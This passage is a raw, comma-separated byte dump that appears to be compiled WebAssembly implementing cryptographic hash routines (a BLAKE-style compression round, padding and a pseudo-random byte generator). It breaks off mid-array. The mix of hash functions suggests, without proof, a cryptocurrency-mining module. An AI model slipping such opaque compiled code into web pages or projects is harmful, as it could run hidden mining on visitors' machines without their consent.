32,32,32,70,32,97,133,34,70,55,3,0,32,33,32,71,32,98,133,34,71,55,3,0,32,34,32,66,32,99,133,34,66,55,3,0,32,35,32,77,32,100,133,34,77,55,3,0,32,36,32,68,32,101,133,34,68,55,3,0,32,37,32,67,32,102,133,34,67,55,3,0,32,38,32,69,32,103,133,34,69,55,3,0,32,39,32,78,32,104,133,34,78,55,3,0,32,40,32,65,32,107,133,34,65,55,3,0,32,41,32,64,32,106,133,34,64,55,3,0,32,42,32,63,32,105,133,34,63,55,3,0,32,6,32,6,41,3,0,66,255,255,255,255,255,255,255,255,191,127,131,34,82,55,3,0,32,2,65,127,106,34,2,4,64,32,3,65,128,1,106,33,3,32,4,41,3,0,33,84,32,65,33,81,32,64,33,65,32,63,33,64,32,82,33,63,12,1,11,11,32,8,32,4,41,3,0,55,3,0,32,9,32,82,55,3,0,32,4,36,4,11,212,18,1,34,127,35,4,33,2,35,4,65,192,0,106,36,4,32,2,32,1,45,0,1,65,16,116,32,1,45,0,0,65,24,116,114,32,1,45,0,2,65,8,116,114,32,1,45,0,3,114,54,2,0,32,2,32,1,45,0,5,65,16,116,32,1,45,0,4,65,24,116,114,32,1,45,0,6,65,8,116,114,32,1,45,0,7,114,54,2,4,32,2,32,1,45,0,9,65,16,116,32,1,45,0,8,65,24,116,114,32,1,45,0,10,65,8,116,114,32,1,45,0,11,114,54,2,8,32,2,32,1,45,0,13,65,16,116,32,1,45,0,12,65,24,116,114,32,1,45,0,14,65,8,116,114,32,1,45,0,15,114,54,2,12,32,2,32,1,45,0,17,65,16,116,32,1,45,0,16,65,24,116,114,32,1,45,0,18,65,8,116,114,32,1,45,0,19,114,54,2,16,32,2,32,1,45,0,21,65,16,116,32,1,45,0,20,65,24,116,114,32,1,45,0,22,65,8,116,114,32,1,45,0,23,114,54,2,20,32,2,32,1,45,0,25,65,16,116,32,1,45,0,24,65,24,116,114,32,1,45,0,26,65,8,116,114,32,1,45,0,27,114,54,2,24,32,2,32,1,45,0,29,65,16,116,32,1,45,0,28,65,24,116,114,32,1,45,0,30,65,8,116,114,32,1,45,0,31,114,54,2,28,32,2,32,1,45,0,33,65,16,116,32,1,45,0,32,65,24,116,114,32,1,45,0,34,65,8,116,114,32,1,45,0,35,114,54,2,32,32,2,32,1,45,0,37,65,16,116,32,1,45,0,36,65,24,116,114,32,1,45,0,38,65,8,116,114,32,1,45,0,39,114,54,2,36,32,2,32,1,45,0,41,65,16,116,32,1,45,0,40,65,24,116,114,32,1,45,0,42,65,8,116,114,32,1,45,0,43,114,54,2,40,32,2,32,1,45,0,45,65,16,116,32,1,45,0,44,65,24,116,114,32,1,45,0,46,65,8,116,114,32,1,45,0,47,114,54,2,44,32,2,32,1,45,0,49,65,16,116,32,1,45,0,48,65,24,116,114,32,1,45,0,50,65,8,116,114,32,1,45,0,51,114,54,2,48,32,2,32,1,45,0,53,65,16,116,32,1,45,0,52,65,24,116,114,32,1,45,0,54,65,8,116,114,32,1,45,0,55,114,54,2,52,32,2,32,1,45,0,57,65,16,116,32,1,45,0,56,65,24,116,114,32,1,45,0,58,65,8,116,114,32,1,45,0,59,114,54,2,56,32,2,32,1,45,0,61,65,16,116,32,1,45,0,60,65,24,116,114,32,1,45,0,62,65,8,116,114,32,1,45,0,63,114,54,2,60,32,0,40,2,0,33,11,32,0,65,4,106,34,23,40,2,0,33,12,32,0,65,8,106,34,24,40,2,0,33,14,32,0,65,12,106,34,25,40,2,0,33,15,32,0,65,16,106,34,26,40,2,0,33,1,32,0,65,20,106,34,27,40,2,0,33,3,32,0,65,24,106,34,28,40,2,0,33,4,32,0,65,28,106,34,29,40,2,0,33,5,32,0,65,32,106,34,30,40,2,0,65,136,213,253,161,2,115,33,13,32,0,65,36,106,34,31,40,2,0,65,211,145,140,173,120,115,33,16,32,0,65,40,106,34,32,40,2,0,65,174,148,230,152,1,115,33,17,32,0,65,44,106,34,33,40,2,0,65,196,230,193,27,115,33,18,32,0,40,2,60,4,127,65,162,240,164,160,122,33,9,65,208,227,252,204,2,33,6,65,152,245,187,193,0,33,10,65,137,217,185,226,126,33,7,65,0,5,32,0,40,2,48,34,6,65,162,240,164,160,122,115,33,9,32,6,65,208,227,252,204,2,115,33,6,32,0,40,2,52,34,7,65,152,245,187,193,0,115,33,10,32,7,65,137,217,185,226,126,115,33,7,65,0,11,33,8,3,64,32,1,32,11,106,32,8,65,4,116,65,145,60,106,45,0,0,34,11,65,2,116,65,144,42,106,40,2,0,32,2,32,8,65,4,116,65,144,60,106,45,0,0,34,19,65,2,116,106,40,2,0,115,106,34,20,32,9,115,34,9,65,16,116,32,9,65,16,118,114,34,9,32,13,106,34,13,32,1,115,34,1,65,20,116,32,1,65,12,118,114,33,1,32,3,32,12,106,32,8,65,4,116,65,147,60,106,45,0,0,34,12,65,2,116,65,144,42,106,40,2,0,32,2,32,8,65,4,116,65,146,60,106,45,0,0,34,21,65,2,116,106,40,2,0,115,106,34,22,32,6,115,34,6,65,16,116,32,6,65,16,118,114,34,6,32,16,106,34,16,32,3,115,34,3,65,20,116,32,3,65,12,118,114,33,3,32,22,32,21,65,2,116,65,144,42,106,40,2,0,32,2,32,12,65,2,116,106,40,2,0,115,106,32,3,106,34,12,32,6,115,34,6,65,24,116,32,6,65,8,118,114,34,6,32,16,106,34,16,32,3,115,34,3,65,25,116,32,3,65,7,118,114,33,3,32,4,32,14,106,32,8,65,4,116,65,149,60,106,45,0,0,34,14,65,2,116,65,144,42,106,40,2,0,32,2,32,8,65,4,116,65,148,60,106,45,0,0,34,21,65,2,116,106,40,2,0,115,106,34,22,32,10,115,34,10,65,16,116,32,10,65,16,118,114,34,10,32,17,106,34,17,32,4,115,34,4,65,20,116,32,4,65,12,118,114,33,4,32,22,32,21,65,2,116,65,144,42,106,40,2,0,32,2,32,14,65,2,116,106,40,2,0,115,106,32,4,106,34,14,32,10,115,34,10,65,24,116,32,10,65,8,118,114,34,10,32,17,106,34,17,32,4,115,34,4,65,25,116,32,4,65,7,118,114,33,4,32,5,32,15,106,32,8,65,4,116,65,151,60,106,45,0,0,34,15,65,2,116,65,144,42,106,40,2,0,32,2,32,8,65,4,116,65,150,60,106,45,0,0,34,21,65,2,116,106,40,2,0,115,106,34,22,32,7,115,34,7,65,16,116,32,7,65,16,118,114,34,7,32,18,106,34,18,32,5,115,34,5,65,20,116,32,5,65,12,118,114,33,5,32,22,32,21,65,2,116,65,144,42,106,40,2,0,32,2,32,15,65,2,116,106,40,2,0,115,106,32,5,106,34,15,32,7,115,34,7,65,24,116,32,7,65,8,118,114,34,7,32,18,106,34,18,32,5,115,34,5,65,25,116,32,5,65,7,118,114,33,5,32,8,65,4,116,65,159,60,106,45,0,0,34,21,65,2,116,65,144,42,106,40,2,0,32,2,32,8,65,4,116,65,158,60,106,45,0,0,34,22,65,2,116,106,40,2,0,115,32,20,32,19,65,2,116,65,144,42,106,40,2,0,32,2,32,11,65,2,116,106,40,2,0,115,106,32,1,106,34,11,32,9,115,34,9,65,24,116,32,9,65,8,118,114,34,9,32,13,106,34,13,32,1,115,34,1,65,25,116,32,1,65,7,118,114,34,1,106,32,15,106,34,15,32,10,115,34,10,65,16,116,32,10,65,16,118,114,34,10,32,16,106,34,16,32,1,115,34,1,65,20,116,32,1,65,12,118,114,33,1,32,15,32,22,65,2,116,65,144,42,106,40,2,0,32,2,32,21,65,2,116,106,40,2,0,115,106,32,1,106,34,15,32,10,115,34,10,65,24,116,32,10,65,8,118,114,34,10,32,16,106,34,16,32,1,115,34,1,65,25,116,32,1,65,7,118,114,33,1,32,8,65,4,116,65,157,60,106,45,0,0,34,19,65,2,116,65,144,42,106,40,2,0,32,2,32,8,65,4,116,65,156,60,106,45,0,0,34,20,65,2,116,106,40,2,0,115,32,14,106,32,5,106,34,14,32,6,115,34,6,65,16,116,32,6,65,16,118,114,34,6,32,13,106,34,13,32,5,115,34,5,65,20,116,32,5,65,12,118,114,33,5,32,14,32,20,65,2,116,65,144,42,106,40,2,0,32,2,32,19,65,2,116,106,40,2,0,115,106,32,5,106,34,14,32,6,115,34,6,65,24,116,32,6,65,8,118,114,34,6,32,13,106,34,13,32,5,115,34,5,65,25,116,32,5,65,7,118,114,33,5,32,3,32,11,106,32,8,65,4,116,65,153,60,106,45,0,0,34,11,65,2,116,65,144,42,106,40,2,0,32,2,32,8,65,4,116,65,152,60,106,45,0,0,34,19,65,2,116,106,40,2,0,115,106,34,20,32,7,115,34,7,65,16,116,32,7,65,16,118,114,34,7,32,17,106,34,17,32,3,115,34,3,65,20,116,32,3,65,12,118,114,33,3,32,20,32,19,65,2,116,65,144,42,106,40,2,0,32,2,32,11,65,2,116,106,40,2,0,115,106,32,3,106,34,11,32,7,115,34,7,65,24,116,32,7,65,8,118,114,34,7,32,17,106,34,17,32,3,115,34,3,65,25,116,32,3,65,7,118,114,33,3,32,4,32,12,106,32,8,65,4,116,65,155,60,106,45,0,0,34,12,65,2,116,65,144,42,106,40,2,0,32,2,32,8,65,4,116,65,154,60,106,45,0,0,34,19,65,2,116,106,40,2,0,115,106,34,20,32,9,115,34,9,65,16,116,32,9,65,16,118,114,34,9,32,18,106,34,18,32,4,115,34,4,65,20,116,32,4,65,12,118,114,33,4,32,20,32,19,65,2,116,65,144,42,106,40,2,0,32,2,32,12,65,2,116,106,40,2,0,115,106,32,4,106,34,12,32,9,115,34,9,65,24,116,32,9,65,8,118,114,34,9,32,18,106,34,18,32,4,115,34,4,65,25,116,32,4,65,7,118,114,33,4,32,8,65,1,106,34,8,65,14,71,13,0,11,32,23,40,2,0,33,8,32,24,40,2,0,33,19,32,25,40,2,0,33,20,32,26,40,2,0,33,21,32,27,40,2,0,33,22,32,28,40,2,0,33,34,32,29,40,2,0,33,35,32,0,32,13,32,11,115,32,0,40,2,0,115,32,30,40,2,0,34,0,115,54,2,0,32,23,32,12,32,16,115,32,8,115,32,31,40,2,0,34,11,115,54,2,0,32,24,32,17,32,14,115,32,19,115,32,32,40,2,0,34,13,115,54,2,0,32,25,32,18,32,15,115,32,20,115,32,33,40,2,0,34,12,115,54,2,0,32,26,32,9,32,1,115,32,21,115,32,0,115,54,2,0,32,27,32,3,32,6,115,32,22,115,32,11,115,54,2,0,32,28,32,4,32,10,115,32,34,115,32,13,115,54,2,0,32,29,32,5,32,7,115,32,35,115,32,12,115,54,2,0,32,2,36,4,11,126,1,4,127,32,0,65,144,131,128,1,106,34,4,40,2,0,34,1,69,4,64,32,0,16,12,15,11,32,1,40,2,0,34,2,4,64,32,2,40,2,4,34,3,4,64,32,3,16,12,32,1,40,2,0,65,0,54,2,4,32,1,40,2,0,33,2,11,32,2,40,2,12,34,3,4,64,32,3,16,12,32,1,40,2,0,65,0,54,2,12,32,1,40,2,0,33,2,11,32,2,16,12,32,1,65,0,54,2,0,32,4,40,2,0,33,1,11,32,1,16,12,32,0,16,12,11,130,8,2,14,127,1,126,35,4,33,3,35,4,65,16,106,36,4,65,160,131,128,1,16,16,34,2,4,64,32,2,65,124,106,40,2,0,65,3,113,4,64,32,2,65,0,65,160,131,128,1,16,14,26,11,11,65,24,16,16,34,0,69,4,64,32,2,65,144,131,128,1,106,65,0,54,2,0,32,3,36,4,32,2,15,11,32,0,65,124,106,40,2,0,65,3,113,4,64,32,0,66,0,55,0,0,32,0,66,0,55,0,8,32,0,66,0,55,0,16,11,32,3,16,7,26,32,3,16,8,33,1,32,3,47,1,4,34,6,16,16,34,4,69,34,7,69,4,64,32,4,65,124,106,40,2,0,65,3,113,4,64,32,4,65,0,32,6,16,14,26,11,11,32,1,40,2,20,33,8,32,1,40,2,16,33,9,32,1,40,2,12,33,10,32,1,40,2,8,33,11,32,1,40,2,4,33,12,32,1,40,2,0,33,1,35,4,33,5,35,4,65,16,106,36,4,65,20,32,5,16,5,33,13,32,5,36,4,32,13,33,5,32,7,69,4,64,32,4,16,12,11,65,128,204,0,32,6,65,237,14,106,32,8,106,32,9,106,32,4,32,6,106,106,32,10,106,32,11,106,32,12,106,32,1,106,32,5,106,34,1,65,127,106,173,55,3,0,32,0,65,0,54,2,0,32,0,65,4,106,34,1,32,1,46,1,0,65,126,113,59,1,0,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,6,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,7,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,8,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,9,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,10,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,11,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,12,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,13,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,14,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,15,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,16,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,17,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,18,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,19,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,20,65,128,204,0,65,128,204,0,41,3,0,66,173,254,213,228,212,133,253,168,216,0,126,66,1,124,34,14,55,3,0,32,0,32,14,66,33,136,167,58,0,21,32,1,32,1,46,1,0,65,2,114,59,1,0,32,2,65,144,131,128,1,106,32,0,54,2,0,32,3,36,4,32,2,11,227,11,1,9,127,35,4,33,3,35,4,65,208,2,106,36,4,32,3,66,0,55,2,0,32,3,66,0,55,2,8,32,3,66,0,55,2,16,32,3,66,0,55,2,24,32,3,66,0,55,2,32,32,3,66,0,55,2,40,32,3,66,0,55,2,48,32,3,65,0,54,2,56,32,3,65,60,106,34,11,65,128,128,4,54,2,0,32,3,65,136,1,106,34,5,65,0,54,2,0,32,3,65,192,0,106,34,6,65,0,54,2,0,32,3,65,196,0,106,34,4,65,0,54,2,0,32,3,65,140,1,106,34,7,65,0,54,2,0,32,3,32,0,32,1,65,255,255,255,255,1,113,34,8,16,24,32,1,65,192,255,255,255,1,113,34,1,32,8,73,4,64,3,64,32,0,32,1,106,44,0,0,33,9,32,5,32,5,40,2,0,34,10,65,1,106,54,2,0,32,3,65,200,0,106,32,10,106,32,9,58,0,0,32,1,65,1,106,34,1,32,8,71,13,0,11,11,32,7,40,2,0,34,1,4,64,32,3,32,5,40,2,0,106,65,199,0,106,34,0,65,1,32,1,116,65,127,106,65,8,32,1,107,116,32,0,45,0,0,113,58,0,0,32,3,32,5,40,2,0,106,65,199,0,106,34,0,65,1,65,7,32,7,40,2,0,107,116,32,0,45,0,0,115,58,0,0,32,7,65,0,54,2,0,5,32,5,32,5,40,2,0,34,0,65,1,106,54,2,0,32,3,65,200,0,106,32,0,106,65,128,127,58,0,0,11,2,64,2,64,32,5,40,2,0,34,0,65,56,74,4,64,32,0,65,192,0,72,4,64,3,64,32,5,32,0,65,1,106,54,2,0,32,3,65,200,0,106,32,0,106,65,0,58,0,0,32,5,40,2,0,34,0,65,192,0,72,13,0,11,11,32,3,32,3,65,200,0,106,65,192,0,16,24,32,5,65,0,54,2,0,65,0,33,0,12,1,5,32,0,65,56,71,13,1,11,12,1,11,3,64,32,5,32,0,65,1,106,54,2,0,32,3,65,200,0,106,32,0,106,65,0,58,0,0,32,5,40,2,0,34,0,65,56,72,13,0,11,11,32,6,32,6,40,2,0,65,1,106,34,1,54,2,0,32,1,69,4,64,32,4,32,4,40,2,0,65,1,106,54,2,0,11,32,5,65,192,0,54,2,0,65,192,0,33,0,3,64,32,5,32,0,65,127,106,34,0,54,2,0,32,3,65,200,0,106,32,0,106,32,1,58,0,0,32,1,65,8,118,33,1,32,5,40,2,0,34,0,65,60,74,13,0,11,32,6,32,1,54,2,0,32,0,65,56,74,4,64,32,4,40,2,0,33,1,3,64,32,5,32,0,65,127,106,34,0,54,2,0,32,3,65,200,0,106,32,0,106,32,1,58,0,0,32,1,65,8,118,33,1,32,5,40,2,0,34,0,65,56,74,13,0,11,32,4,32,1,54,2,0,11,32,3,32,3,65,200,0,106,65,192,0,16,24,32,3,65,144,2,106,34,4,32,3,41,2,0,55,2,0,32,4,32,3,41,2,8,55,2,8,32,4,32,3,41,2,16,55,2,16,32,4,32,3,41,2,24,55,2,24,32,4,32,3,41,2,32,55,2,32,32,4,32,3,41,2,40,55,2,40,32,4,32,3,41,2,48,55,2,48,32,4,32,3,41,2,56,55,2,56,32,4,32,3,65,208,1,106,34,1,65,0,16,10,32,1,32,3,65,144,1,106,34,0,65,1,16,10,32,0,32,1,65,2,16,10,32,1,32,0,65,3,16,10,32,0,32,1,65,4,16,10,32,1,32,0,65,5,16,10,32,0,32,1,65,6,16,10,32,1,32,0,65,7,16,10,32,0,32,1,65,8,16,10,32,1,32,4,65,9,16,10,32,3,32,3,40,2,0,32,4,40,2,0,115,54,2,0,32,3,65,4,106,34,0,32,0,40,2,0,32,4,40,2,4,115,54,2,0,32,3,65,8,106,34,0,32,0,40,2,0,32,4,40,2,8,115,54,2,0,32,3,65,12,106,34,0,32,0,40,2,0,32,4,40,2,12,115,54,2,0,32,3,65,16,106,34,0,32,0,40,2,0,32,4,40,2,16,115,54,2,0,32,3,65,20,106,34,0,32,0,40,2,0,32,4,40,2,20,115,54,2,0,32,3,65,24,106,34,0,32,0,40,2,0,32,4,40,2,24,115,54,2,0,32,3,65,28,106,34,0,32,0,40,2,0,32,4,40,2,28,115,54,2,0,32,3,65,32,106,34,0,40,2,0,32,4,40,2,32,115,33,6,32,0,32,6,54,2,0,32,3,65,36,106,34,0,40,2,0,32,4,40,2,36,115,33,7,32,0,32,7,54,2,0,32,3,65,40,106,34,0,40,2,0,32,4,40,2,40,115,33,8,32,0,32,8,54,2,0,32,3,65,44,106,34,0,40,2,0,32,4,40,2,44,115,33,9,32,0,32,9,54,2,0,32,3,65,48,106,34,0,40,2,0,32,4,40,2,48,115,33,10,32,0,32,10,54,2,0,32,3,65,52,106,34,0,40,2,0,32,4,40,2,52,115,33,1,32,0,32,1,54,2,0,32,3,65,56,106,34,0,32,0,40,2,0,32,4,40,2,56,115,54,2,0,32,11,32,11,40,2,0,32,4,40,2,60,115,54,2,0,32,2,32,6,58,0,0,32,2,32,6,65,8,118,58,0,1,32,2,32,6,65,16,118,58,0,2,32,2,32,6,65,24,118,58,0,3,32,2,32,7,58,0,4,32,2,32,7,65,8,118,58,0,5,32,2,32,7,65,16,118,58,0,6,32,2,32,7,65,24,118,58,0,7,32,2,32,8,58,0,8,32,2,32,8,65,8,118,58,0,9,32,2,32,8,65,16,118,58,0,10,32,2,32,8,65,24,118,58,0,11,32,2,32,9,58,0,12,32,2,32,9,65,8,118,58,0,13,32,2,32,9,65,16,118,58,0,14,32,2,32,9,65,24,118,58,0,15,32,2,32,10,58,0,16,32,2,32,10,65,8,118,58,0,17,32,2,32,10,65,16,118,58,0,18,32,2,32,10,65,24,118,58,0,19,32,2,32,1,58,0,20,32,2,32,1,65,8,118,58,0,21,32,2,32,1,65,16,118,58,0,22,32,2,32,3,44,0,55,58,0,23,32,2,32,0,44,0,0,58,0,24,32,2,32,3,44,0,57,58,0,25,32,2,32,3,44,0,58,58,0,26,32,2,32,3,44,0,59,58,0,27,32,2,32,11,44,0,0,58,0,28,32,2,32,3,44,0,61,58,0,29,32,2,32,3,44,0,62,58,0,30,32,2,32,3,44,0,63,58,0,31,32,3,36,4,11,93,1,1,127,32,1,32,0,72,32,0,32,1,32,2,106,72,113,4,64,32,1,32,2,106,33,1,32,0,34,3,32,2,106,33,0,3,64,32,2,65,0,74,4,64,32,2,65,1,107,33,2,32,0,65,1,107,34,0,32,1,65,1,107,34,1,44,0,0,58,0,0,12,1,11,11,32,3,33,0,5,32,0,32,1,32,2,16,11,26,11,32,0,11,180,13,1,11,127,35,4,33,6,35,4,65,160,3,106,36,4,32,6,34,7,65,128,4,54,2,0,32,7,65,128,2,54,2,8,32,7,65,32,106,34,3,65,192,41,41,3,0,55,3,0,32,3,65,200,41,41,3,0,55,3,8,32,3,65,208,41,41,3,0,55,3,16,32,3,65,216,41,41,3,0,55,3,24,32,3,65,224,41,41,3,0,55,3,32,32,3,65,232,41,41,3,0,55,3,40,32,3,65,240,41,41,3,0,55,3,48,32,3,65,248,41,41,3,0,55,3,56,32,7,65,16,106,34,13,66,0,55,3,0,32,7,65,24,106,34,11,66,128,128,128,128,128,128,128,128,240,0,55,3,0,32,7,65,12,106,34,12,65,0,54,2,0,32,7,65,8,106,33,9,32,1,65,255,255,255,255,1,113,34,6,65,127,106,34,10,65,64,113,33,8,32,1,65,3,116,65,135,4,75,4,64,32,9,32,0,32,10,65,6,118,65,192,0,16,23,32,6,32,8,107,33,6,32,0,32,8,106,33,0,11,32,6,4,64,32,9,65,216,0,106,32,12,40,2,0,34,1,106,32,0,32,6,16,11,26,32,12,32,1,32,6,106,54,2,0,11,32,7,65,160,2,106,33,4,2,64,2,64,2,64,2,64,32,7,40,2,0,65,8,118,65,3,113,14,3,2,1,0,3,11,32,7,65,8,106,33,9,32,11,32,11,41,3,0,66,128,128,128,128,128,128,128,128,128,127,132,55,3,0,32,12,40,2,0,34,0,65,192,0,73,4,64,32,9,65,216,0,106,32,0,106,65,0,65,192,0,32,0,107,16,14,26,11,32,9,32,7,65,224,0,106,34,5,65,1,32,0,16,23,32,9,40,2,0,65,7,106,65,3,118,33,8,32,5,66,0,55,3,0,32,5,66,0,55,3,8,32,5,66,0,55,3,16,32,5,66,0,55,3,24,32,5,66,0,55,3,32,32,5,66,0,55,3,40,32,5,66,0,55,3,48,32,5,66,0,55,3,56,32,4,32,3,41,3,0,55,3,0,32,4,32,3,41,3,8,55,3,8,32,4,32,3,41,3,16,55,3,16,32,4,32,3,41,3,24,55,3,24,32,4,32,3,41,3,32,55,3,32,32,4,32,3,41,3,40,55,3,40,32,4,32,3,41,3,48,55,3,48,32,4,32,3,41,3,56,55,3,56,32,8,4,64,32,8,65,127,106,65,6,118,33,10,65,0,33,6,65,0,33,0,3,64,32,5,32,6,173,55,3,0,32,13,66,0,55,3,0,32,11,66,128,128,128,128,128,128,128,128,127,55,3,0,32,12,65,0,54,2,0,32,9,32,5,65,1,65,8,16,23,32,2,32,0,106,32,3,32,8,32,0,107,34,0,65,192,0,73,4,127,32,0,5,65,192,0,11,16,11,26,32,3,32,4,41,3,0,55,3,0,32,3,32,4,41,3,8,55,3,8,32,3,32,4,41,3,16,55,3,16,32,3,32,4,41,3,24,55,3,24,32,3,32,4,41,3,32,55,3,32,32,3,32,4,41,3,40,55,3,40,32,3,32,4,41,3,48,55,3,48,32,3,32,4,41,3,56,55,3,56,32,6,65,1,106,34,1,65,6,116,33,0,32,6,32,10,71,4,64,32,1,33,6,12,1,11,11,11,32,7,36,4,15,11,32,7,65,8,106,33,10,32,11,32,11,41,3,0,66,128,128,128,128,128,128,128,128,128,127,132,55,3,0,32,12,40,2,0,34,0,65,32,73,4,64,32,10,65,56,106,32,0,106,65,0,65,32,32,0,107,16,14,26,11,32,10,32,7,65,192,0,106,34,8,65,1,32,0,16,25,32,10,40,2,0,65,7,106,65,3,118,33,6,32,8,66,0,55,3,0,32,8,66,0,55,3,8,32,8,66,0,55,3,16,32,8,66,0,55,3,24,32,4,32,3,41,3,0,55,3,0,32,4,32,3,41,3,8,55,3,8,32,4,32,3,41,3,16,55,3,16,32,4,32,3,41,3,24,55,3,24,32,6,4,64,65,0,33,0,3,64,32,8,32,0,173,55,3,0,32,13,66,0,55,3,0,32,11,66,128,128,128,128,128,128,128,128,127,55,3,0,32,12,65,0,54,2,0,32,10,32,8,65,1,65,8,16,25,32,2,32,0,106,32,3,32,6,32,0,107,34,1,65,32,73,4,127,32,1,5,65,32,11,16,11,26,32,3,32,4,41,3,0,55,3,0,32,3,32,4,41,3,8,55,3,8,32,3,32,4,41,3,16,55,3,16,32,3,32,4,41,3,24,55,3,24,32,6,32,0,65,32,106,34,0,75,13,0,11,11,32,7,36,4,15,11,32,11,32,11,41,3,0,66,128,128,128,128,128,128,128,128,128,127,132,55,3,0,32,12,40,2,0,34,0,65,128,1,73,4,64,32,7,65,160,1,106,32,0,106,65,0,65,128,1,32,0,107,16,14,26,11,32,7,65,8,106,34,8,32,7,65,160,1,106,34,5,65,1,32,0,16,26,32,8,40,2,0,65,7,106,65,3,118,33,9,32,5,66,0,55,3,0,32,5,66,0,55,3,8,32,5,66,0,55,3,16,32,5,66,0,55,3,24,32,5,66,0,55,3,32,32,5,66,0,55,3,40,32,5,66,0,55,3,48,32,5,66,0,55,3,56,32,5,66,0,55,3,64,32,5,66,0,55,3,72,32,5,66,0,55,3,80,32,5,66,0,55,3,88,32,5,66,0,55,3,96,32,5,66,0,55,3,104,32,5,66,0,55,3,112,32,5,66,0,55,3,120,32,4,32,3,41,3,0,55,3,0,32,4,32,3,41,3,8,55,3,8,32,4,32,3,41,3,16,55,3,16,32,4,32,3,41,3,24,55,3,24,32,4,32,3,41,3,32,55,3,32,32,4,32,3,41,3,40,55,3,40,32,4,32,3,41,3,48,55,3,48,32,4,32,3,41,3,56,55,3,56,32,4,32,3,41,3,64,55,3,64,32,4,32,3,41,3,72,55,3,72,32,4,32,3,41,3,80,55,3,80,32,4,32,3,41,3,88,55,3,88,32,4,32,3,41,3,96,55,3,96,32,4,32,3,41,3,104,55,3,104,32,4,32,3,41,3,112,55,3,112,32,4,32,3,41,3,120,55,3,120,32,9,4,64,32,9,65,127,106,65,7,118,33,10,65,0,33,6,65,0,33,0,3,64,32,5,32,6,173,55,3,0,32,13,66,0,55,3,0,32,11,66,128,128,128,128,128,128,128,128,127,55,3,0,32,12,65,0,54,2,0,32,8,32,5,65,1,65,8,16,26,32,2,32,0,106,32,3,32,9,32,0,107,34,0,65,128,1,73,4,127,32,0,5,65,128,1,11,16,11,26,32,3,32,4,41,3,0,55,3,0,32,3,32,4,41,3,8,55,3,8,32,3,32,4,41,3,16,55,3,16,32,3,32,4,41,3,24,55,3,24,32,3,32,4,41,3,32,55,3,32,32,3,32,4,41,3,40,55,3,40,32,3,32,4,41,3,48,55,3,48,32,3,32,4,41,3,56,55,3,56,32,3,32,4,41,3,64,55,3,64,32,3,32,4,41,3,72,55,3,72,32,3,32,4,41,3,80,55,3,80,32,3,32,4,41,3,88,55,3,88,32,3,32,4,41,3,96,55,3,96,32,3,32,4,41,3,104,55,3,104,32,3,32,4,41,3,112,55,3,112,32,3,32,4,41,3,120,55,3,120,32,6,65,1,106,34,1,65,7,116,33,0,32,6,32,10,71,4,64,32,1,33,6,12,1,11,11,11,32,7,36,4,15,11,32,7,36,4,11,214,9,2,4,127,2,126,35,4,33,3,35,4,65,224,1,106,36,4,32,3,65,8,106,34,5,66,0,55,3,8,32,3,65,128,2,54,2,0,32,3,65,32,106,34,4,65,176,62,41,0,0,55,0,0,32,4,65,184,62,41,0,0,55,0,8,32,4,65,192,62,41,0,0,55,0,16,32,4,65,200,62,41,0,0,55,0,24,32,4,65,208,62,41,0,0,55,0,32,32,4,65,216,62,41,0,0,55,0,40,32,4,65,224,62,41,0,0,55,0,48,32,4,65,232,62,41,0,0,55,0,56,32,4,65,240,62,41,0,0,55,0,64,32,4,65,248,62,41,0,0,55,0,72,32,4,65,128,63,41,0,0,55,0,80,32,4,65,136,63,41,0,0,55,0,88,32,4,65,144,63,41,0,0,55,0,96,32,4,65,152,63,41,0,0,55,0,104,32,4,65,160,63,41,0,0,55,0,112,32,4,65,168,63,41,0,0,55,0,120,32,5,32,1,65,3,116,34,1,173,34,7,55,3,0,32,1,65,255,3,75,4,127,32,3,65,160,1,106,33,1,3,64,32,1,32,0,32,8,167,106,34,4,41,0,0,55,0,0,32,1,32,4,41,0,8,55,0,8,32,1,32,4,41,0,16,55,0,16,32,1,32,4,41,0,24,55,0,24,32,1,32,4,41,0,32,55,0,32,32,1,32,4,41,0,40,55,0,40,32,1,32,4,41,0,48,55,0,48,32,1,32,4,41,0,56,55,0,56,32,3,16,22,32,8,66,192,0,124,33,8,32,7,66,128,124,124,34,7,66,255,3,86,13,0,11,32,8,167,5,65,0,11,33,1,32,3,65,16,106,33,4,32,7,66,0,82,4,64,32,3,65,160,1,106,33,6,32,0,32,1,106,33,0,32,7,66,3,136,66,63,131,